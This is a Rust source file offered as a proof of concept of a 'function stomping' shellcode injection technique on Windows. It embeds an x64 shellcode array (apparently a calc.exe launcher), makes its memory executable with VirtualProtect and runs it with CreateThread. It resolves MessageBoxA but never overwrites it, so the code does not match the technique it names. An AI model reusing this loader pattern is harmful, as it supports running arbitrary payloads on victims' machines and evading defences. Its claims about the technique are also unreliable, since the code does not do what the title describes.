/*
    Function CUSTOM Stomping Injection
    Resource Used: 
        MSDOCS
        https://github.com/Idov31/FunctionStomping
    @5mukx
*/

// # This Program and its POC are Different from others. 
// Let me explain line by line 
// 
macro_rules! error {
    ($msg:expr) => {
        println!("[-] {}", format!($msg));
        println!("Process Exited Due to Error");
        std::process::exit(0);
    }
}

use std::{
    ffi::c_void,
    ptr::{copy, null, null_mut},
};

use std::mem::transmute;

const SHELLCODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

/*
    * declaring winapi functions using extern "system" ?
    
    Wait what is extern "system" ?
        
        * The extern keyword is used to declare functions that are defined outside of Rust, typically in C or C++ libraries.
        * The "system" ABI (Application Binary Interface) specifies that the function follows the calling conventions used by 
            the system, which is important for ensuring correct function calls between Rust and system libraries.

    Wait this means that you dont need to import creates like winapi or windows ?!
        * YES: extern "system" allows you to declare and call functions directly from the system libraries that was written in C/C++.
                like those provided by windows os.
        * 

*/
extern "system" {
    // declaring function signatures. 
    fn LoadLibraryA(lpLibFileName: *const u8) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
    fn VirtualProtect(lpAddress: *mut c_void, dwSize: usize, flNewProtect: u32, lpflOldProtect: *mut u32) -> i32;
    fn CreateThread(
        lpThreadAttributes: *const c_void,
        dwStackSize: usize,
        lpStartAddress: unsafe extern "system" fn(*mut c_void) -> u32,
        lpParameter: *mut c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
    ) -> *mut c_void;
    fn WaitForSingleObject(hHandle: *mut c_void, dwMilliseconds: u32) -> u32;
}

const PAGE_EXECUTE_READWRITE: u32 = 0x40; 
const PAGE_READWRITE: u32 = 0x04;
const INFINITE: u32 = 0xFFFFFFFF;

unsafe extern "system" fn shellcode_thread(_: *mut c_void) -> u32 {

    let func_ptr = transmute::<_, *mut c_void>(SHELLCODE.as_ptr());

    let mut oldprotect = 0u32;
    if VirtualProtect(func_ptr, SHELLCODE.len(), PAGE_READWRITE, &mut oldprotect) == 0 {
        error!("[!] VirtualProtect (1) Failed");
    }

    copy(SHELLCODE.as_ptr(), func_ptr as *mut u8, SHELLCODE.len());

    if VirtualProtect(func_ptr, SHELLCODE.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect) == 0 {
        error!("[!] VirtualProtect (2) Failed");
    }

    let hthread = CreateThread(
        null(),
        0,
        transmute(func_ptr),
        null_mut(),
        0,
        null_mut(),
    );

    if hthread.is_null(){
        error!("[!] CreateThread Failed");
    }

    WaitForSingleObject(hthread, INFINITE);

    0
}

fn main() {
    unsafe {

        let library_name = b"user32.dll\0";
        let function_name = b"MessageBoxA\0";
        
        // Loading user32.dll library
        let h_module = LoadLibraryA(library_name.as_ptr());
        if h_module.is_null() {
            error!("[!] LoadLibraryA Failed");
        }

        // Calling GetProcAddress to receive the address of the MessageBoxA from the lib
        let func = GetProcAddress(h_module, function_name.as_ptr());
        if func.is_null() {
            error!("[!] GetProcAddress Failed");
        }

        // stores the handle to the created thread
        let hthread = CreateThread(
            null(),
            0,
            shellcode_thread,
            null_mut(),
            0,
            null_mut(),
        );

        if hthread.is_null() {
            error!("[!] CreateThread Failed");
        }
        // Wait until the thread execution Finishes 
        WaitForSingleObject(hthread, INFINITE);
    }
}

